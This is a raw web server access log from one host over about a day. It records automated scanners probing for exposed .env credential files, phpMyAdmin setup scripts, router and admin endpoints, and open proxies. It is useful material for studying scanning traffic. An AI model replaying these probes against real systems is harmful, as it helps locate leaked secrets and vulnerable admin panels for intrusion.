45.83.67.182 - - [10/Sep/2022:20:17:20 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0"
45.83.67.146 - - [10/Sep/2022:20:17:21 +0000] "GET /favicon.ico HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0"
27.150.190.96 - - [10/Sep/2022:20:25:55 +0000] "GET http://35.178.166.217:80/pma/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
27.150.190.96 - - [10/Sep/2022:20:25:55 +0000] "GET http://35.178.166.217:80/phpMyAdmin/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
27.150.190.96 - - [10/Sep/2022:20:25:55 +0000] "GET http://35.178.166.217:80/mysql/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
192.34.56.97 - - [10/Sep/2022:20:28:33 +0000] "GET / HTTP/1.1" 200 32 "http://35.178.166.217:80/left.html" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0"
154.198.211.140 - - [10/Sep/2022:21:04:02 +0000] "\x16\x03\x01" 400 226 "-" "-"
154.198.211.140 - - [10/Sep/2022:21:04:13 +0000] "GET / HTTP/1.1" 200 32 "-" "-"
154.198.211.140 - - [10/Sep/2022:21:04:18 +0000] "GET /favicon.ico HTTP/1.1" 404 196 "-" "Go-http-client/1.1"
154.198.211.140 - - [10/Sep/2022:21:04:19 +0000] "GET /robots.txt HTTP/1.1" 404 196 "-" "Go-http-client/1.1"
154.198.211.140 - - [10/Sep/2022:21:04:20 +0000] "GET /sitemap.xml HTTP/1.1" 404 196 "-" "Go-http-client/1.1"
185.40.4.19 - - [10/Sep/2022:21:05:45 +0000] "GET / HTTP/1.1" 200 32 "-" "-"
95.214.235.205 - - [10/Sep/2022:21:15:14 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [10/Sep/2022:21:15:14 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
101.43.142.201 - - [10/Sep/2022:21:18:05 +0000] "GET http://35.178.166.217:80/phpMyAdmin/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
101.43.142.201 - - [10/Sep/2022:21:18:05 +0000] "GET http://35.178.166.217:80/db/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
101.43.142.201 - - [10/Sep/2022:21:18:05 +0000] "GET http://35.178.166.217:80/pma/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
101.43.142.201 - - [10/Sep/2022:21:18:05 +0000] "GET http://35.178.166.217:80/mysql/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
77.157.25.218 - - [10/Sep/2022:21:30:18 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
135.125.244.48 - - [10/Sep/2022:22:06:00 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [10/Sep/2022:22:06:00 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
205.210.31.15 - - [10/Sep/2022:22:07:08 +0000] "\x16\x03\x01" 400 226 "-" "-"
95.214.235.205 - - [10/Sep/2022:22:45:19 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [10/Sep/2022:22:45:20 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [10/Sep/2022:23:05:26 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [10/Sep/2022:23:05:26 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
192.241.216.15 - - [10/Sep/2022:23:33:58 +0000] "GET /portal/redlion HTTP/1.1" 404 196 "-" "Mozilla/5.0 zgrab/0.x"
192.241.220.141 - - [11/Sep/2022:00:08:50 +0000] "GET /actuator/health HTTP/1.1" 404 196 "-" "Mozilla/5.0 zgrab/0.x"
95.214.235.205 - - [11/Sep/2022:00:15:06 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [11/Sep/2022:00:15:06 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.40.4.19 - - [11/Sep/2022:00:36:15 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0"
135.125.244.48 - - [11/Sep/2022:00:41:34 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [11/Sep/2022:00:41:34 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.226.208.101 - - [11/Sep/2022:01:43:35 +0000] "GET /.env HTTP/1.1" 404 196 "-" "MMozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.2.24) Gecko/20111103 Firefox/3.6.24"
54.226.208.101 - - [11/Sep/2022:01:43:35 +0000] "POST / HTTP/1.1" 200 32 "-" "MMozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.2.24) Gecko/20111103 Firefox/3.6.24"
95.214.235.205 - - [11/Sep/2022:01:46:27 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.171.51.119 - - [11/Sep/2022:01:46:27 +0000] "GET / HTTP/1.1" 200 32 "-" "python-requests/2.28.1"
95.214.235.205 - - [11/Sep/2022:01:46:27 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.171.51.119 - - [11/Sep/2022:01:46:27 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
20.171.51.119 - - [11/Sep/2022:01:46:28 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
135.125.244.48 - - [11/Sep/2022:02:26:23 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [11/Sep/2022:02:26:23 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [11/Sep/2022:03:15:18 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [11/Sep/2022:03:15:18 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [11/Sep/2022:03:15:39 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [11/Sep/2022:03:15:39 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
34.76.96.55 - - [11/Sep/2022:03:33:43 +0000] "GET / HTTP/1.1" 200 32 "-" "python-requests/2.28.1"
128.14.134.134 - - [11/Sep/2022:04:01:07 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
101.43.68.37 - - [11/Sep/2022:04:04:40 +0000] "GET http://35.178.166.217:80/mysql/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
101.43.68.37 - - [11/Sep/2022:04:04:40 +0000] "GET http://35.178.166.217:80/pma/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
101.43.68.37 - - [11/Sep/2022:04:04:40 +0000] "GET http://35.178.166.217:80/phpMyAdmin/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
101.43.68.37 - - [11/Sep/2022:04:04:40 +0000] "GET http://35.178.166.217:80/db/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
95.214.235.205 - - [11/Sep/2022:04:44:29 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [11/Sep/2022:04:44:29 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
118.123.105.87 - - [11/Sep/2022:05:24:35 +0000] "GET / HTTP/1.0" 200 32 "-" "-"
118.123.105.87 - - [11/Sep/2022:05:24:36 +0000] "GET /favicon.ico HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
118.123.105.87 - - [11/Sep/2022:05:24:36 +0000] "GET /robots.txt HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
118.123.105.87 - - [11/Sep/2022:05:24:37 +0000] "GET /.well-known/security.txt HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
135.125.244.48 - - [11/Sep/2022:05:29:05 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [11/Sep/2022:05:29:05 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
192.241.219.174 - - [11/Sep/2022:06:07:36 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 zgrab/0.x"
95.214.235.205 - - [11/Sep/2022:06:15:18 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [11/Sep/2022:06:15:19 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
172.104.242.173 - - [11/Sep/2022:06:37:11 +0000] "GET /0bef HTTP/1.0" 404 196 "-" "-"
135.125.246.189 - - [11/Sep/2022:06:40:20 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [11/Sep/2022:06:40:20 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [11/Sep/2022:07:45:59 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [11/Sep/2022:07:46:00 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [11/Sep/2022:08:04:27 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [11/Sep/2022:08:04:27 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
193.118.53.210 - - [11/Sep/2022:08:46:37 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
193.118.53.210 - - [11/Sep/2022:08:46:37 +0000] "GET /webfig/ HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
95.214.235.205 - - [11/Sep/2022:09:15:04 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [11/Sep/2022:09:15:05 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [11/Sep/2022:09:21:46 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [11/Sep/2022:09:21:46 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
182.254.225.35 - - [11/Sep/2022:09:41:43 +0000] "GET http://35.178.166.217:80/mysql/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
182.254.225.35 - - [11/Sep/2022:09:41:43 +0000] "GET http://35.178.166.217:80/db/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
182.254.225.35 - - [11/Sep/2022:09:41:43 +0000] "GET http://35.178.166.217:80/pma/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
182.254.225.35 - - [11/Sep/2022:09:41:43 +0000] "GET http://35.178.166.217:80/phpMyAdmin/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
95.214.235.205 - - [11/Sep/2022:10:44:41 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [11/Sep/2022:10:44:41 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
43.138.16.192 - - [11/Sep/2022:11:05:42 +0000] "GET http://35.178.166.217:80/pma/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
43.138.16.192 - - [11/Sep/2022:11:05:42 +0000] "GET http://35.178.166.217:80/mysql/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
43.138.16.192 - - [11/Sep/2022:11:05:42 +0000] "GET http://35.178.166.217:80/db/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
43.138.16.192 - - [11/Sep/2022:11:05:42 +0000] "GET http://35.178.166.217:80/phpMyAdmin/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
203.76.241.10 - - [11/Sep/2022:11:12:49 +0000] "GET http://35.178.166.217:80/pma/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
203.76.241.10 - - [11/Sep/2022:11:12:49 +0000] "GET http://35.178.166.217:80/mysql/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
203.76.241.10 - - [11/Sep/2022:11:12:49 +0000] "GET http://35.178.166.217:80/phpMyAdmin/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
203.76.241.10 - - [11/Sep/2022:11:12:49 +0000] "GET http://35.178.166.217:80/db/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
135.125.246.189 - - [11/Sep/2022:11:15:48 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [11/Sep/2022:11:15:48 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
90.151.171.106 - - [11/Sep/2022:12:07:59 +0000] "CONNECT check.best-proxies.ru:443 HTTP/1.1" 405 224 "-" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from)"
90.151.171.106 - - [11/Sep/2022:12:08:13 +0000] "GET http://check.best-proxies.ru/ip.php?Z71860198950Q1 HTTP/1.1" 404 16 "https://google.com/" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from)"
90.151.171.106 - - [11/Sep/2022:12:08:34 +0000] "-" 408 - "-" "-"
95.214.235.205 - - [11/Sep/2022:12:15:05 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [11/Sep/2022:12:15:06 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [11/Sep/2022:12:37:42 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [11/Sep/2022:12:37:42 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
90.151.171.106 - - [11/Sep/2022:13:07:33 +0000] "CONNECT check.best-proxies.ru:443 HTTP/1.1" 405 224 "-" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from)"
90.151.171.106 - - [11/Sep/2022:13:07:44 +0000] "GET http://check.best-proxies.ru/ip.php?Z71860198950Q1 HTTP/1.1" 404 16 "https://google.com/" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from)"
95.214.235.205 - - [11/Sep/2022:13:44:38 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [11/Sep/2022:13:44:38 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [11/Sep/2022:14:13:51 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [11/Sep/2022:14:13:51 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
85.159.215.86 - - [11/Sep/2022:14:38:50 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0"
85.159.215.86 - - [11/Sep/2022:14:38:50 +0000] "\x16\x03\x01" 400 226 "-" "-"
167.94.138.47 - - [11/Sep/2022:14:42:41 +0000] "GET / HTTP/1.1" 200 32 "-" "-"
167.94.138.47 - - [11/Sep/2022:14:42:42 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.138.47 - - [11/Sep/2022:14:42:42 +0000] "GET /favicon.ico HTTP/1.1" 404 196 "-" "Go-http-client/1.1"
157.119.216.9 - - [11/Sep/2022:14:58:43 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
95.214.235.205 - - [11/Sep/2022:15:15:10 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [11/Sep/2022:15:15:11 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
103.203.56.1 - - [11/Sep/2022:15:39:31 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0"
135.125.246.189 - - [11/Sep/2022:15:41:15 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [11/Sep/2022:15:41:16 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
195.178.120.159 - - [11/Sep/2022:15:44:00 +0000] "GET / HTTP/1.1" 200 32 "http://35.178.166.217:80/left.html" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0"
46.60.95.217 - - [11/Sep/2022:15:55:50 +0000] "HEAD / HTTP/1.1" 200 - "-" "python-requests/2.27.1"
103.75.32.41 - - [11/Sep/2022:16:22:33 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
135.125.246.189 - - [11/Sep/2022:16:43:12 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [11/Sep/2022:16:43:12 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [11/Sep/2022:16:43:58 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [11/Sep/2022:16:43:58 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
121.32.78.59 - - [11/Sep/2022:16:53:48 +0000] "GET / HTTP/1.0" 200 32 "-" "-"
179.43.145.74 - - [11/Sep/2022:17:03:19 +0000] "GET / HTTP/1.1" 200 32 "-" "Linux Gnu (cow)"
103.144.14.198 - - [11/Sep/2022:18:07:00 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
205.210.31.20 - - [11/Sep/2022:18:12:26 +0000] "\x16\x03\x01" 400 226 "-" "-"
95.214.235.205 - - [11/Sep/2022:18:14:13 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [11/Sep/2022:18:14:14 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [11/Sep/2022:18:18:39 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [11/Sep/2022:18:18:39 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
165.227.0.21 - - [11/Sep/2022:18:23:49 +0000] "GET / HTTP/1.0" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:98.0) Gecko/20100101 Firefox/98.0"
82.205.55.54 - - [11/Sep/2022:18:24:01 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
143.255.242.183 - - [11/Sep/2022:19:02:19 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
43.138.16.192 - - [11/Sep/2022:19:02:28 +0000] "GET http://35.178.166.217:80/phpMyAdmin/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
43.138.16.192 - - [11/Sep/2022:19:02:28 +0000] "GET http://35.178.166.217:80/db/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
43.138.16.192 - - [11/Sep/2022:19:02:28 +0000] "GET http://35.178.166.217:80/mysql/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
43.138.16.192 - - [11/Sep/2022:19:02:28 +0000] "GET http://35.178.166.217:80/pma/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
193.118.53.194 - - [11/Sep/2022:19:13:00 +0000] "GET /solr/ HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
45.61.186.85 - - [11/Sep/2022:19:22:40 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0"
135.125.246.189 - - [11/Sep/2022:19:27:59 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [11/Sep/2022:19:27:59 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
120.86.254.208 - - [11/Sep/2022:19:43:45 +0000] "POST /HNAP1/ HTTP/1.0" 400 226 "-" "-"
